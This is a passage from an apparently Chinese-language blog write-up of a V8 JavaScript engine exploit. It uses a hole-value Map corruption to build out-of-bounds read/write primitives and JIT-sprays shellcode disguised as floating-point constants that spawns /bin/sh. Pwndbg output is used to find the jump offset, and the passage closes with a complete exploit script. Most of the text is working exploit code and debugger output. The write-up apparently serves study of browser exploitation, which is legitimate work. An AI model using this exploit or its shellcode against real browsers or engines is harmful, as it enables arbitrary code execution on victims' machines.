<li>‰ΩÜÊàë‰ª¨Ê≤°ÊúâËøîÂõû <code>read_gadget[0]</code> ÂÄº</li>
<li>ËÄåÊòØ‰∏∫ <code>read_gadget[0]</code> ÂàÜÈÖç‰∫ÜÊàë‰ª¨ÊâÄÈúÄÁöÑÂÄº</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    read_gadget[<span class="number">0</span>] = itof(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Êé•‰∏ãÊù•Êàë‰ª¨ÈúÄË¶ÅÂØªÊâæÊéßÂà∂ RIP ÁöÑÊñπÊ≥ïÔºàÂä´ÊåÅÁ®ãÂ∫èÁöÑÊâßË°åÊµÅÔºâ</p>
<p>ÂÆûÈôÖ‰∏äÔºåÂèØ‰ª•ÈÄöËøá JIT Âñ∑Â∞ÑÊîªÂáªÊù•Ëµ∞ÁßÅ shellcode ‰ª£Á†ÅÔºöÔºàÁªïËøá sandboxÔºâ</p>
<ul>
<li>Êàë‰ª¨ÂèØ‰ª•ÂÅöÁöÑÊòØÂ∞ÜÊàë‰ª¨ÁöÑ shellcode ËΩ¨Êç¢‰∏∫ÊµÆÁÇπÊï∞Ôºå‰ª•‰æøÊàë‰ª¨ÁöÑÊµÆÁÇπÊï∞ÂçÅÂÖ≠ËøõÂà∂ÊåâÂéüÊ†∑Â≠òÂÇ®Âú® Jitted ÂáΩÊï∞Âå∫Âüü‰∏≠</li>
<li>ÂÆû‰æã‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = ()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;foo();foo();foo();foo();&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>JavaScript ‰∏≠ÂÆö‰πâÁöÑÊµÆÁÇπÂÆûÈôÖ‰∏äÊòØËµ∞ÁßÅÁöÑ shellcode</li>
<li>ÂÆÉÂ∞ÜÊâßË°å <code>sys_execve(&#39;/bin/sh&#39;)</code></li>
<li>Áî±‰∫éËØ•ÂáΩÊï∞Ë¢´Ë∞ÉÁî®‰∫ÜÂæàÂ§öÊ¨°ÔºåÂõ†Ê≠§ v8 Â∞ÜÂØπ‰ª£Á†ÅËøõË°å JITÔºàÂêØÁî® TURBOFANÔºâ</li>
</ul>
<p>‰ΩøÁî® GDB ÊâìÂç∞ÂÜÖÂ≠ò‰ø°ÊÅØÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(foo)</span><br><span class="line">DebugPrint: <span class="number">0xc25002c278d</span>: [Function] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c2500184241</span> &lt;Map[<span class="number">28</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0c25001840f5</span> &lt;JSFunction (sfi = <span class="number">0xc2500145dfd</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x0c2500002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: <span class="number">0x0c2500199f11</span> &lt;SharedFunctionInfo foo&gt;</span><br><span class="line"> - name: <span class="number">0x0c2500199ea5</span> &lt;String[<span class="number">3</span>]: <span class="meta">#foo&gt;</span></span><br><span class="line"> - formal_parameter_count: <span class="number">0</span></span><br><span class="line"> - kind: ArrowFunction</span><br><span class="line"> - context: <span class="number">0x0c250019a005</span> &lt;ScriptContext[<span class="number">3</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x0c250019a2dd</span> &lt;CodeDataContainer TURBOFAN&gt;</span><br><span class="line"> - source code: ()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"> - properties: <span class="number">0x0c2500002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="function">All own <span class="title">properties</span> <span class="params">(excluding elements)</span>: </span>&#123;</span><br><span class="line">    <span class="number">0xc2500006551</span>: [String] in ReadOnlySpace: <span class="meta">#length: 0x0c25001442fd <span class="meta-string">&lt;AccessorInfo name= 0x0c2500006551 &lt;String[6]: #length&gt;</span>, data= 0x0c25000023e1 <span class="meta-string">&lt;undefined&gt;</span>&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line">    <span class="number">0xc2500006799</span>: [String] in ReadOnlySpace: <span class="meta">#name: 0x0c25001442e5 <span class="meta-string">&lt;AccessorInfo name= 0x0c2500006799 &lt;String[4]: #name&gt;</span>, data= 0x0c25000023e1 <span class="meta-string">&lt;undefined&gt;</span>&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - feedback <span class="built_in">vector</span>: <span class="number">0xc250019a0c9</span>: [FeedbackVector] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c250000273d</span> &lt;Map(FEEDBACK_VECTOR_TYPE)&gt;</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - shared function info: <span class="number">0x0c2500199f11</span> &lt;SharedFunctionInfo foo&gt;</span><br><span class="line"> - no optimized code</span><br><span class="line"> - tiering state: TieringState::kNone</span><br><span class="line"> - maybe has maglev code: <span class="number">0</span></span><br><span class="line"> - maybe has turbofan code: <span class="number">0</span></span><br><span class="line"> - invocation count: <span class="number">214279</span></span><br><span class="line"> - profiler ticks: <span class="number">0</span></span><br><span class="line"> - closure feedback cell <span class="built_in">array</span>: <span class="number">0xc2500003511</span>: [ClosureFeedbackCellArray] in ReadOnlySpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c2500002981</span> &lt;Map(CLOSURE_FEEDBACK_CELL_ARRAY_TYPE)&gt;</span><br><span class="line"> - length: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> - slot #<span class="number">0</span> Literal  &#123;</span><br><span class="line">     [<span class="number">0</span>]: <span class="number">0x0c250019a185</span> &lt;AllocationSite&gt;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="number">0xc2500184241</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_FUNCTION_TYPE</span><br><span class="line"> - instance size: <span class="number">28</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="class"><span class="keyword">enum</span> <span class="title">length</span>:</span> invalid</span><br><span class="line"> - callable</span><br><span class="line"> - back pointer: <span class="number">0x0c25000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x0c25001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">2</span>: <span class="number">0x0c2500184269</span> &lt;DescriptorArray[<span class="number">2</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x0c25001840f5</span> &lt;JSFunction (sfi = <span class="number">0xc2500145dfd</span>)&gt;</span><br><span class="line"> - constructor: <span class="number">0x0c2500002261</span> &lt;null&gt;</span><br><span class="line"> - dependent code: <span class="number">0x0c25000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ËØ∑Ê≥®ÊÑèÔºå<code>foo</code> ÊñπÊ≥ï‰∏≠Êúâ‰∏Ä‰∏™Âêç‰∏∫ code ÁöÑÂ±ûÊÄßÔºåÂÖ∂‰∏≠Âü∫‰∫é gdb ‰∏≠ÁöÑÊ£ÄÊü•ÔºåÂÅèÁßªÈáè‰∏∫ <code>foo+0x18</code></li>
<li>Êé•‰∏ãÊù•ÊâìÂç∞ code Â±ûÊÄßÁöÑ‰ø°ÊÅØÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x0c250019a2dd</span></span><br><span class="line"><span class="number">0xc250019a2dd</span>: [CodeDataContainer] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c2500002a71</span> &lt;Map[<span class="number">28</span>](CODE_DATA_CONTAINER_TYPE)&gt;</span><br><span class="line"> - kind: TURBOFAN</span><br><span class="line"> - is_off_heap_trampoline: <span class="number">0</span></span><br><span class="line"> - code: <span class="number">0x55e3400042c1</span> &lt;Code TURBOFAN&gt;</span><br><span class="line"> - code_entry_point: <span class="number">0x55e340004300</span></span><br><span class="line"> - kind_specific_flags: <span class="number">4</span></span><br></pre></td></tr></table></figure>
<ul>
<li>codeÔºöÊåáÂêë jitted code Âå∫ÂüüÔºà<code>code + 0x8</code>Ôºâ</li>
<li>code_entry_pointÔºöÊåáÂêë jitted code Êåá‰ª§ÁöÑÂºÄÂ§¥Ôºà<code>code + 0xc</code>Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x55e3400042c1</span> <span class="comment">/* jitted code */</span></span><br><span class="line"><span class="number">0x55e3400042c1</span>: [Code]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c250000264d</span> &lt;Map(CODE_TYPE)&gt;</span><br><span class="line"> - code_data_container: <span class="number">0x0c250019a2dd</span> &lt;CodeDataContainer TURBOFAN&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55e340004300</span> <span class="comment">/* code_entry_point */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>‚îÇ  <span class="number">0x55e340004300</span> ‚óÇ‚Äî mov    ebx, dword ptr [rcx - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>‚îÇ  <span class="number">0x55e340004308</span> ‚óÇ‚Äî <span class="number">0x1fe88e70850f0117</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>‚îÇ  <span class="number">0x55e340004310</span> ‚óÇ‚Äî push   rbp</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>‚îÇ  <span class="number">0x55e340004318</span> ‚óÇ‚Äî sub    esp, <span class="number">8</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>‚îÇ  <span class="number">0x55e340004320</span> ‚óÇ‚Äî xchg   bl, bh</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>‚îÇ  <span class="number">0x55e340004328</span> ‚óÇ‚Äî add    bh, cl</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>‚îÇ  <span class="number">0x55e340004330</span> ‚óÇ‚Äî cmp    qword ptr [r13 + <span class="number">0xcf08</span>], rdi</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>‚îÇ  <span class="number">0x55e340004338</span> ‚óÇ‚Äî xchg   byte ptr [rbx], dl</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>‚îÇ  <span class="number">0x55e340004340</span> ‚óÇ‚Äî cmp    byte ptr [rcx - <span class="number">0x77</span>], cl</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>‚îÇ  <span class="number">0x55e340004348</span> ‚óÇ‚Äî add    rcx, <span class="number">1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>‚îÇ  <span class="number">0x55e340004350</span> ‚óÇ‚Äî add    al, byte ptr [rax]</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>‚îÇ  <span class="number">0x55e340004358</span> ‚óÇ‚Äî add    ecx, dword ptr [r8 + rax]</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>‚îÇ  <span class="number">0x55e340004360</span> ‚óÇ‚Äî jbe    <span class="number">0x55e340004322</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>‚îÇ  <span class="number">0x55e340004368</span> ‚óÇ‚Äî stc    </span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>‚îÇ  <span class="number">0x55e340004370</span> ‚óÇ‚Äî <span class="number">0x68732f68ba4907</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>‚îÇ  <span class="number">0x55e340004378</span> ‚óÇ‚Äî pop    rax</span><br></pre></td></tr></table></figure>
<p>‰ΩøÁî® WAAÔºåËÆ©Êàë‰ª¨ÈÄöËøáÁßªÂä®ÂÖ∂Â≠òÂÇ®ÂÄºÊù•Ë¶ÜÁõñÊ≠§ <code>code_entry_point</code>Ôºå‰ª•ÊåáÂêëÊàë‰ª¨ÁöÑÁ¨¨‰∏Ä‰∏™Ëµ∞ÁßÅ <code>shellcode</code>Ôºå‰ª•‰æøÂΩìÊàë‰ª¨Ë∞ÉÁî® <code>foo</code> Êó∂ÔºåÂÆÉÂ∞ÜË∑≥ËΩ¨Âπ∂ÊâßË°åÊàë‰ª¨ÊûÑÂª∫ÁöÑ <code>shellcode</code></p>
<ul>
<li>PSÔºöÊúÄÂ•ΩÂ∞ÜÁõÆÊ†á JIT ‰ª£Á†ÅÊîæÂú®Êñá‰ª∂ÁöÑÈ°∂ÈÉ®ÔºåËøôÊ†∑ÂÆÉÂ∞±‰∏ç‰ºöÂºÑ‰π±Êàë‰ª¨ÂàõÂª∫ÁöÑ WAA</li>
</ul>
<p>ÊúÄÂêéÁöÑÂÖ•‰æµÊ≠•È™§Ôºö</p>
<ul>
<li>ÊâßË°å <code>addrof(foo)</code> Ëé∑Âèñ <code>foo</code> ÂØπË±°ÁöÑÂú∞ÂùÄ</li>
<li>‰ΩøÁî® <code>weak_read</code> Ëé∑Âèñ <code>foo+0x18</code>Ôºà<code>foo-&gt;code</code>Ôºâ</li>
<li>‰ΩøÁî® <code>weak_read</code> Ëé∑Âèñ <code>foo-&gt;code+0xc</code>Ôºà<code>foo-&gt;code-&gt;code_entry_point</code>Ôºâ</li>
<li>‰ΩøÁî® <code>weak_write</code> Âú® <code>foo-&gt;code</code> Â§ÑË¶ÜÁõñ‰∏ä <code>foo-&gt;code-&gt;code_entry_point+shift_offset</code>ÔºàÂÖ∂‰∏≠ <code>shift_offset</code> ÊòØËµ∑Âßã JIT ‰ª£Á†ÅÊåá‰ª§Âà∞Ëµ∞ÁßÅÁöÑ <code>shellcode</code> ‰ª£Á†Å‰πãÈó¥ÁöÑË∑ùÁ¶ªÔºâ</li>
</ul>
<p>ÈÄöËøáË∞ÉËØïÊù•ÂØªÊâæ <code>shift_offset</code> ÁöÑÂÄºÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5577a0004b00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>‚îÇ  <span class="number">0x5577a0004b00</span> ‚óÇ‚Äî mov    ebx, dword ptr [rcx - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>‚îÇ  <span class="number">0x5577a0004b08</span> ‚óÇ‚Äî <span class="number">0x1fe88670850f0117</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>‚îÇ  <span class="number">0x5577a0004b10</span> ‚óÇ‚Äî push   rbp</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>‚îÇ  <span class="number">0x5577a0004b18</span> ‚óÇ‚Äî sub    esp, <span class="number">8</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>‚îÇ  <span class="number">0x5577a0004b20</span> ‚óÇ‚Äî xchg   bl, bh</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>‚îÇ  <span class="number">0x5577a0004b28</span> ‚óÇ‚Äî add    bh, cl</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>‚îÇ  <span class="number">0x5577a0004b30</span> ‚óÇ‚Äî cmp    qword ptr [r13 + <span class="number">0xcf08</span>], rdi</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>‚îÇ  <span class="number">0x5577a0004b38</span> ‚óÇ‚Äî xchg   byte ptr [rbx], dl</span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>‚îÇ  <span class="number">0x5577a0004b40</span> ‚óÇ‚Äî cmp    byte ptr [rcx - <span class="number">0x77</span>], cl</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>‚îÇ  <span class="number">0x5577a0004b48</span> ‚óÇ‚Äî add    rcx, <span class="number">1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>‚îÇ  <span class="number">0x5577a0004b50</span> ‚óÇ‚Äî add    al, byte ptr [rax]</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>‚îÇ  <span class="number">0x5577a0004b58</span> ‚óÇ‚Äî add    ecx, dword ptr [r8 + rax]</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>‚îÇ  <span class="number">0x5577a0004b60</span> ‚óÇ‚Äî jbe    <span class="number">0x5577a0004b22</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>‚îÇ  <span class="number">0x5577a0004b68</span> ‚óÇ‚Äî stc    </span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>‚îÇ  <span class="number">0x5577a0004b70</span> ‚óÇ‚Äî <span class="number">0x68732f68ba4907</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>‚îÇ  <span class="number">0x5577a0004b78</span> ‚óÇ‚Äî pop    rax</span><br></pre></td></tr></table></figure>
<p>ÂÖ∂ÂÆûËøô‰∏™ <code>shellcode</code> ÁöÑÂºÄÂ§¥Êúâ‰∏ÄÂ§ÑÂæàÊòéÊòæÁöÑÁâπÂæÅÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:   <span class="number">68</span> <span class="number">2f</span> <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>          push   <span class="number">0x68732f</span></span><br><span class="line"><span class="number">5</span>:   <span class="number">58</span>                      pop    rax</span><br><span class="line"><span class="number">6</span>:   eb <span class="number">0</span>c                   jmp    <span class="number">0x14</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ÈÄöËøá <code>0x68732f</code> Â∞±ÂèØ‰ª•Âø´ÈÄüÂÆö‰Ωç <code>shellcode</code>Ôºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5577a0004b00</span>+<span class="number">115</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>‚îÇ  <span class="number">0x5577a0004b73</span> ‚óÇ‚Äî push   <span class="number">0x68732f</span> <span class="comment">/* &#x27;h/sh&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>‚îÇ  <span class="number">0x5577a0004b7b</span> ‚óÇ‚Äî vmovq  xmm0, r10</span><br></pre></td></tr></table></figure>
<ul>
<li><code>shift_offset</code> ÁöÑÂÄºÂ∞±ÊòØ‚Äú115‚Äù</li>
</ul>
<p>ÂÆåÊï¥ exp Â¶Ç‰∏ãÔºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="function">()=&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;foo();foo();foo();foo();&#125;</span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BigInt</span>(u64_buf[<span class="number">0</span>]) + (<span class="built_in">BigInt</span>(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    u64_buf[<span class="number">0</span>] = <span class="built_in">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">    u64_buf[<span class="number">1</span>] = <span class="built_in">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">m.set(c.hole(), <span class="number">1</span>);</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(<span class="number">1</span>);</span><br><span class="line">oob_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>);</span><br><span class="line">m.set(<span class="number">0x10</span>, -<span class="number">1</span>);</span><br><span class="line">m.set(oob_arr, <span class="number">0xffff</span>);</span><br><span class="line">victim = [&#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;];</span><br><span class="line">read_gadget = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">in_obj</span>) </span>&#123;</span><br><span class="line">    mask = (<span class="number">1n</span> &lt;&lt; <span class="number">32n</span>) - <span class="number">1n</span></span><br><span class="line">    victim[<span class="number">0</span>] = in_obj;</span><br><span class="line">    <span class="keyword">return</span> ftoi(oob_arr[<span class="number">12</span>]) &amp; mask;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    <span class="keyword">return</span> ftoi(read_gadget[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    read_gadget[<span class="number">0</span>] = itof(value);</span><br><span class="line">&#125;</span><br><span class="line">f_foo = addrof(foo);</span><br><span class="line">f_code = weak_read(f_foo+<span class="number">0x18n</span>) &amp; ((<span class="number">1n</span> &lt;&lt; <span class="number">32n</span>) - <span class="number">1n</span>);</span><br><span class="line">f_code_code_entry_point = weak_read(f_code+<span class="number">0xcn</span>);</span><br><span class="line">weak_write(f_code+<span class="number">0xcn</span>, f_code_code_entry_point+<span class="number">115n</span>);</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure>
